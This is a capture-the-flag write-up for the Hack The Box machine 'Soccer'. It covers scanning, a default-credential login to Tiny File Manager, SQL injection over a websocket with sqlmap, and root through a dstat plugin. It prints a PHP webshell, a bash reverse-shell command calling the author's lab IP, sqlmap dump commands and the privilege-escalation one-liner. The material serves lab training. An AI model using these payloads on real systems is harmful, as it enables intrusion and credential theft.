---
icon: ubuntu
---

# Soccer - Easy

<figure><img src="../../.gitbook/assets/image (3341).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/soccer"><strong>Soccer</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP Scan" expandable="true" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.11.87 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-23 10:14 -0400
Nmap scan report for 10.129.11.87
Host is up (0.050s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Mon, 23 Mar 2026 14:15:26 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Mon, 23 Mar 2026 14:15:27 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.98%I=7%D=3/23%Time=69C14AF8%P=x86_64-pc-linux-gnu%r(in
SF:formix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\
SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x20139\r\nDate:\x20Mon,\x2023\x20Mar\x202026\x2014:15:26\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang
SF:=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</
SF:head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HT
SF:TPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\
SF:r\nDate:\x20Mon,\x2023\x20Mar\x202026\x2014:15:27\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<me
SF:ta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>C
SF:annot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HT
SF:TP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-s
SF:rc\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Mon,\
SF:x2023\x20Mar\x202026\x2014:15:27\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"u
SF:tf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\
SF:x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   29.43 ms 10.10.16.1
2   58.53 ms 10.129.11.87
```
{% endcode %}

We have a redirect to soccer.htb I'll add it to my hosts file

{% code title="/etc/hosts" expandable="true" %}
```shellscript
10.129.11.87	soccer.htb
```
{% endcode %}

### <mark style="color:blue;">HTTP Port 80 TCP</mark>

#### <mark style="color:$primary;">Tech Detection</mark>

{% code title="curl -I http://soccer.htb/" expandable="true" %}
```shellscript
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 23 Mar 2026 14:23:44 GMT
Content-Type: text/html
Content-Length: 6917
Last-Modified: Thu, 17 Nov 2022 08:07:11 GMT
Connection: keep-alive
ETag: "6375ebaf-1b05"
Accept-Ranges: bytes
```
{% endcode %}

We have an nginx server, doesn't really offer anything else

#### <mark style="color:$primary;">Directory Busting</mark>

{% code expandable="true" %}
```shellscript
feroxbuster -u http://soccer.htb/ -n
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3342).png" alt=""><figcaption></figcaption></figure>

We found an interesting redirect. Let's check it out

### <mark style="color:blue;">Tiny File Manager CVE-2021-45010 RCE</mark>

<figure><img src="../../.gitbook/assets/image (3343).png" alt=""><figcaption></figcaption></figure>

It's an instance of Tiny File Manager

Default credentials work for login: <mark style="color:$success;">**admin:admin@123**</mark>

<figure><img src="../../.gitbook/assets/image (3344).png" alt=""><figcaption></figcaption></figure>

We got a version at the bottom of the page

A quick google search we come acroos an exploit

{% embed url="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit" %}

<figure><img src="../../.gitbook/assets/image (3345).png" alt=""><figcaption></figcaption></figure>

This is pretty simple, We can actually do this manually

* Step 1 Create a simple php webshell

{% code title="rev.php" expandable="true" %}
```php
<?php system($_REQUEST["cmd"]); ?>
```
{% endcode %}

* Step 2 upload our rev.php file

<figure><img src="../../.gitbook/assets/image (3346).png" alt=""><figcaption></figcaption></figure>

* Now navigate to `/tiny/uploads`

<figure><img src="../../.gitbook/assets/image (3347).png" alt=""><figcaption></figcaption></figure>

You should see our uploaded file owned by www-data

* Now to test it

{% code expandable="true" %}
```shellscript
curl http://soccer.htb/tiny/uploads/rev.php -d 'cmd=id'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3348).png" alt=""><figcaption></figcaption></figure>

* Now to get a reverse shell

{% code overflow="wrap" expandable="true" %}
```shellscript
curl http://soccer.htb/tiny/uploads/rev.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.63/443 0>%261"'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3349).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as www-data</mark>

#### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (3350).png" alt=""><figcaption></figcaption></figure>

besides root there is another user on this box.

<figure><img src="../../.gitbook/assets/image (3351).png" alt=""><figcaption></figcaption></figure>

The web server proxies any request that uses the `soc-player.soccer.htb` domain to the internal website running on port `3000` all we need to do is to add the `soc-player.soccer.htb` domain name to our `hosts`  file

{% code title="/etc/hosts" overflow="wrap" expandable="true" %}
```shellscript
10.129.11.87	soccer.htb soc-player.soccer.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3352).png" alt=""><figcaption></figcaption></figure>

Besides the website on port 3000 we also have mysql running on localhost

<figure><img src="../../.gitbook/assets/image (3353).png" alt=""><figcaption></figcaption></figure>

We can only see `www-data` ‘s processes. This is because the proc filesystem `procfs` was mounted with `hidepid=2` . This option prevents one user from viewing other users’ processes

All right let's check out soc-player.soccer.htb

### <mark style="color:blue;">soc-player.soccer.htb</mark>

#### <mark style="color:$primary;">Tech Detection</mark>

{% code title="curl -I http://soc-player.soccer.htb/" overflow="wrap" expandable="true" %}
```shellscript
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 23 Mar 2026 16:01:04 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 6749
Connection: keep-alive
X-Powered-By: Express
ETag: W/"1a5d-j2rGKcxb2vG5mw817o9kuCXUG9A"
Set-Cookie: connect.sid=s%3A9GYATm47CoZc-N0mA66UJwjX3MyoHVi7.iyHc%2BXCQaoaXCHJX14lWJj6aGTfYzQthXXj6bBU%2FfOo; Path=/; HttpOnly
```
{% endcode %}

Nginx server, running express a NodeJS web framework

#### <mark style="color:$primary;">Site</mark>

<figure><img src="../../.gitbook/assets/image (3354).png" alt=""><figcaption></figcaption></figure>

The site is similar to soccer.htb except for the 2 new Login & Signup pages

I'll create an account and login

<figure><img src="../../.gitbook/assets/image (3355).png" alt=""><figcaption></figcaption></figure>

After logging in I see a ticketing form.&#x20;

<figure><img src="../../.gitbook/assets/image (3356).png" alt=""><figcaption></figcaption></figure>

Putting our ticket id in it tells us the ticket exists

<figure><img src="../../.gitbook/assets/image (3357).png" alt=""><figcaption></figcaption></figure>

if we put another number in it says it doesn't exist

#### <mark style="color:$primary;">Websockets</mark>

Logging in submits a POST request to `/login`. On success, it returns a 302 redirect to `/check`. As that page is loading, it makes a request to `soc-player.soccer.htb:9091`, which returns a 101

**HTTP 101 is a Switching Protocols response:**

<figure><img src="../../.gitbook/assets/image (3358).png" alt=""><figcaption></figcaption></figure>

TCP 9091 is a websocket server.&#x20;

Checking the source code the usage of websocket is confirmed

<figure><img src="../../.gitbook/assets/image (3359).png" alt=""><figcaption></figcaption></figure>

we can also see how it's sending the message.

### <mark style="color:blue;">Websocket Blind SQLI</mark>

A **websocket** is a full-duplex communication protocol that allows client (web browser, application) and server to exchange data. Here are some differences between HTTP and websocket :

* Unlike HTTP, which is **stateless** and requires a new connection for each request-response cycle, websocket is a **stateful** protocol. This means the connection between the client and server remains open until explicitly closed by either party. Say in other words, websocket uses persistent connections while HTTP opens a new connection for each request.
* Websocket supports **full-duplex communication**, allowing both client and server to send messages to each other simultaneously. In contrast, HTTP operates on a request-response (**half-duplex**) model, where a client must wait for a server response before sending another request.

**Note :** To establish a websocket connection, an initial HTTP handshake occurs. If successful, the server responds with **HTTP status code 101 (Switching Protocols)** to indicate the upgrade to the websocket protocol.

That being said, let’s perform our SQLi attack using sqlmap :

{% code overflow="wrap" expandable="true" %}
```shellscript
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3
```
{% endcode %}

The URL starts with `ws://` see that we are performing a websocket SQL injection. Moreover, you may also encounter `wss://` (websocket secure) which is the secure version of `ws://`&#x20;

<figure><img src="../../.gitbook/assets/image (3360).png" alt=""><figcaption></figcaption></figure>

The output confirms that the websocket is vulnerable to a boolean-based and time-based SQLi

* I'll enumerate the Databases:

{% code overflow="wrap" expandable="true" %}
```shellscript
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --dbs
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3361).png" alt=""><figcaption></figcaption></figure>

Let's check out the tables in  -> soccer\_db

{% code overflow="wrap" expandable="true" %}
```shellscript
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 -D 'soccer_db' --tables
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3362).png" alt=""><figcaption></figcaption></figure>

There is only one table. I'll dump the data from this table

{% code overflow="wrap" expandable="true" %}
```shellscript
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 -D 'soccer_db' -T 'accounts' --dump
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3363).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" expandable="true" %}
```shellscript
player:PlayerOftheMatch2022
```
{% endcode %}

The table stores a clear text password that belongs to the user `player`. Let's see if it works over ssh

<figure><img src="../../.gitbook/assets/image (3364).png" alt=""><figcaption></figcaption></figure>

We have ssh access!

### <mark style="color:blue;">Shell as player</mark>

{% code overflow="wrap" expandable="true" %}
```shellscript
ssh player@soccer.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3365).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Linpeas</mark>

Runing Linpeas on the box I saw the SUID set on doas

<figure><img src="../../.gitbook/assets/image (3367).png" alt=""><figcaption></figcaption></figure>

player can run the command `dstat` as root

#### <mark style="color:$primary;">About Dstat</mark>

`dstat` is a tool for getting system information. Looking at the [man page](https://linux.die.net/man/1/dstat), there’s a section on plugins that says:

While anyone can create their own dstat plugins (and contribute them) dstat ships with a number of plugins already that extend its capabilities greatly.

At the very bottom of the page, it has a section on files:

Paths that may contain external dstat\_\*.py plugins:

{% code overflow="wrap" expandable="true" %}
```shellscript
~/.dstat/
(path of binary)/plugins/
/usr/share/dstat/
/usr/local/share/dstat/
```
{% endcode %}

Plugins are Python scripts with the name `dstat_[plugin name].py`.

### <mark style="color:blue;">Malicious Path</mark>

I’ll write a very simple plugin:

{% code overflow="wrap" expandable="true" %}
```python
import os

os.system("/bin/bash")
```
{% endcode %}

This will drop into Bash for an interactive shell.

Looking at the list of locations, I can obviously write to `~/.dstat`, but when run with `doas`, it’ll be running as root, and therefore won’t check `/home/player/.dstat`. Luckily, `/usr/local/share/dstat` is writable.

{% code overflow="wrap" expandable="true" %}
```shellscript
echo -e 'import os\n\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_deimos.py
```
{% endcode %}

With that in place, I’ll invoke `dstat` with the deimos plugin:

{% code overflow="wrap" expandable="true" %}
```shellscript
doas /usr/bin/dstat --deimos
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3368).png" alt=""><figcaption></figcaption></figure>
